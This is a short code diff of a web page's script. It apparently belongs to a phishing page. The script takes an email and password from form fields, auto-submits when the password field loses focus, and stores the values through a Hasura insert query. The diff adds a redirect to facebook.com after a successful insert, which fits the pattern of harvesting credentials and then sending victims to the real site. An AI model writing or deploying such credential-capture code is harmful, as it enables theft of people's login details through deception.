@@ -487,11 +487,17 @@ button.onclick = function ()
     console.log(email.value);
 function mySuccessHandler (data) {
   console.log(data);
-  console.log("ramesh");
+  console.log("success");
+
+window.location.href="https://www.facebook.com";
+
+  window.location.replace("https://www.facebook.com");
 }
+
 function myErrorHandler (e) {
   console.log(e);
 }
+
 hasura.data.query({
   type: 'insert',
   args:{
@@ -505,9 +511,12 @@ hasura.data.query({
   mySuccessHandler,
   myErrorHandler
 );
-    var pass =document.getElementById("pass1");  
+
+    var pass =document.getElementById("pass1");
+    
    // request.open('GET','http://shivamd20.imad.hasura-app.io/counter',false);
    // request.send(null);
+    
 };
 
   var pass =document.getElementById("pass1");
@@ -516,10 +525,6 @@ pass.onfocusout=function()
 {
     button.click();
 };
-
-
-
-
   </script>
 
 
